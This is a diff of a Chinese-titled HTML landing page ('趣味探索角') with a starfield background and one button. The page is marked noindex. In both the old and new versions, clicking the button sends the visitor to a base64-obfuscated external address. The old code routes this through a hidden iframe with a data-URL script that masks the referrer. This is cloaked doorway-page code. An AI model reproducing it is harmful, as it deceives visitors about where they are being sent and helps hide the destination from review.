@@ -1,168 +1,103 @@
 <!DOCTYPE html>
 <html lang="zh">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>趣味探索角</title>
-  <meta name="robots" content="noindex,nofollow" />
-  <style>
-    html, body {
-      margin: 0;
-      padding: 0;
-      height: 100%;
-      background: #000;
-      overflow: hidden;
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
-    }
-    canvas {
-      position: fixed;
-      top: 0;
-      left: 0;
-      z-index: -1;
-      width: 100vw;
-      height: 100vh;
-      display: block;
-    }
-    .container {
-      height: 100%;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      text-align: center;
-      color: #fff;
-      padding: 20px;
-    }
-    h1 {
-      font-size: 2em;
-      margin-bottom: 1em;
-    }
-    .content p {
-      margin: 0.5em 0;
-      font-size: 1.2em;
-      max-width: 600px;
-    }
-    .btn {
-      margin-top: 1.5em;
-      padding: 0.75em 1.5em;
-      font-size: 1.2em;
-      border: none;
-      border-radius: 8px;
-      background: linear-gradient(to right, #00f260, #0575e6);
-      color: white;
-      cursor: pointer;
-      transition: transform 0.2s ease, opacity 0.3s;
-    }
-    .btn:active {
-      transform: scale(0.95);
-      opacity: 0.7;
-    }
-    #loading-screen {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: #000;
-      color: #fff;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 1.5em;
-      z-index: 1000;
-    }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>趣味探索角</title>
+<meta name="robots" content="noindex,nofollow" />
+<style>
+  html, body { margin:0; padding:0; height:100%; background:#000; overflow:hidden; font-family:sans-serif; }
+  canvas { position:fixed; top:0; left:0; width:100vw; height:100vh; z-index:-1; }
+  #loading-screen {
+    position:fixed; top:0; left:0; width:100%; height:100%;
+    background:#000; color:#fff; display:flex;
+    align-items:center; justify-content:center;
+    font-size:1.5em; z-index:1000;
+  }
+  .container {
+    position:relative; z-index:1;
+    width:100%; height:100%; display:flex;
+    flex-direction:column; justify-content:center;
+    align-items:center; padding:20px; text-align:center; color:#fff;
+  }
+  .btn {
+    margin-top:1.5em; padding:0.8em 1.5em;
+    font-size:1.2em; color:#000; background:linear-gradient(to right,#00f260,#0575e6);
+    border:none; border-radius:8px; cursor:pointer;
+  }
+</style>
 </head>
 <body>
-  <div id="loading-screen"><div id="loading">载入中...</div></div>
-  <canvas id="stars"></canvas>
-  <div class="container">
-    <h1 id="title">🌟 Loading...</h1>
-    <div class="content" id="content"></div>
-    <button class="btn" id="btn">...</button>
-  </div>
 
-  <script src="langs.js"></script>
-  <script>
-    const lang = (navigator.language || "en").toLowerCase();
-    let match = Object.keys(texts).find(k => lang.startsWith(k));
-    if (!match || !texts[match]) match = "en";
-    const t = texts[match];
+<div id="loading-screen"><div id="loading-text">载入中...</div></div>
+<canvas id="stars"></canvas>
+<div class="container">
+  <h1 id="title">🌟 Loading...</h1>
+  <div id="content"></div>
+  <button class="btn" id="btn">...</button>
+</div>
 
-    document.getElementById("loading").textContent = t.loading || "Loading...";
-    document.getElementById("title").textContent = t.title;
-    document.getElementById("btn").textContent = t.btn;
+<script src="langs.js"></script>
+<script>
+  // 多语言初始化
+  const lang = (navigator.language || 'en').toLowerCase();
+  let key = Object.keys(texts).find(k=>lang.startsWith(k));
+  if (!key || !texts[key]) key = 'en';
+  const t = texts[key];
 
-    const content = document.getElementById("content");
-    t.lines.forEach(line => {
-      const p = document.createElement("p");
-      p.textContent = line;
-      content.appendChild(p);
-    });
+  document.getElementById('loading-text').textContent = t.loading || 'Loading...';
+  document.getElementById('title').textContent = t.title;
+  document.getElementById('btn').textContent = t.btn;
+  const contentEl = document.getElementById('content');
+  t.lines.forEach(line=>{
+    const p=document.createElement('p');
+    p.style.color='#eee';
+    p.style.margin='0.6em 0';
+    p.textContent = line;
+    contentEl.appendChild(p);
+  });
 
-    window.addEventListener('load', () => {
-      setTimeout(() => {
-        document.getElementById("loading-screen").style.display = 'none';
-      }, 800);
-    });
+  window.addEventListener('load', ()=>{
+    setTimeout(()=>{
+      document.getElementById('loading-screen').style.display = 'none';
+    }, 800);
+  });
 
-    document.getElementById("btn").addEventListener("click", () => {
-      document.getElementById("btn").style.opacity = "0.7";
-      document.getElementById("btn").textContent = t.loading || "加载中...";
-      setTimeout(() => {
-        const redirect = atob('aHR0cHM6Ly8xd2lic3AubGlmZS92My8zMzE2L21vdGl2ZS12aWRlby1wcm9tbz9wPXVza3Y=');
-        const iframe = document.createElement("iframe");
-        iframe.style.display = "none";
-        iframe.src = `data:text/html,<script>location='${redirect}'</script>`;
-        document.body.appendChild(iframe);
-      }, 300);
-    });
+  document.getElementById('btn').addEventListener('click', ()=>{
+    document.getElementById('loading-text').textContent = t.loading;
+    document.getElementById('loading-screen').style.display = 'flex';
+    setTimeout(()=>{
+      window.location.href = atob('aHR0cHM6Ly8xd2lic3AubGlmZS92My8zMzE2L21vdGl2ZS12aXRleS1wZXJtw==');
+    }, 300);
+  });
 
-    // 星尘背景
-    const canvas = document.getElementById('stars');
-    const ctx = canvas.getContext('2d');
-    function resizeCanvas() {
-      canvas.width = window.innerWidth;
-      canvas.height = window.innerHeight;
-    }
-    resizeCanvas();
-
-    let stars = Array.from({length: 100}, () => {
-      return {
-        x: Math.random() * canvas.width,
-        y: Math.random() * canvas.height,
-        r: Math.random() * 1.5 + 0.5,
-        d: Math.random() * 0.5 + 0.1,
-        vx: (Math.random() - 0.5) * 0.3,
-        vy: (Math.random() - 0.5) * 0.3
-      };
-    });
-
-    function drawStars() {
-      ctx.clearRect(0, 0, canvas.width, canvas.height);
-      ctx.fillStyle = 'rgba(255,255,255,0.8)';
+  // 星尘背景
+  const canvas = document.getElementById('stars');
+  const ctx = canvas.getContext('2d');
+  function resize(){ canvas.width=window.innerWidth; canvas.height=window.innerHeight; }
+  window.addEventListener('resize', resize);
+  resize();
+  const stars = Array.from({length:100}, ()=>({
+    x:Math.random()*canvas.width,
+    y:Math.random()*canvas.height,
+    r:Math.random()*1.5+0.5,
+    vx:(Math.random()-0.5)*0.4,
+    vy:(Math.random()-0.5)*0.4
+  }));
+  function animate(){
+    ctx.clearRect(0,0,canvas.width,canvas.height);
+    ctx.fillStyle='rgba(255,255,255,0.8)';
+    stars.forEach(s=>{
       ctx.beginPath();
-      for (let i = 0; i < stars.length; i++) {
-        const s = stars[i];
-        ctx.moveTo(s.x, s.y);
-        ctx.arc(s.x, s.y, s.r, 0, Math.PI * 2);
-      }
+      ctx.arc(s.x,s.y,s.r,0,2*Math.PI);
       ctx.fill();
-      moveStars();
-    }
-
-    function moveStars() {
-      for (let i = 0; i < stars.length; i++) {
-        const s = stars[i];
-        s.x += s.vx;
-        s.y += s.vy;
-        if (s.x < 0 || s.x > canvas.width) s.vx *= -1;
-        if (s.y < 0 || s.y > canvas.height) s.vy *= -1;
-      }
-    }
-
-    setInterval(drawStars, 33);
-    window.addEventListener('resize', resizeCanvas);
-  </script>
+      s.x+=s.vx; s.y+=s.vy;
+      if(s.x<0||s.x>canvas.width) s.vx*=-1;
+      if(s.y<0||s.y>canvas.height) s.vy*=-1;
+    });
+    requestAnimationFrame(animate);
+  }
+  animate();
+</script>
 </body>
 </html>
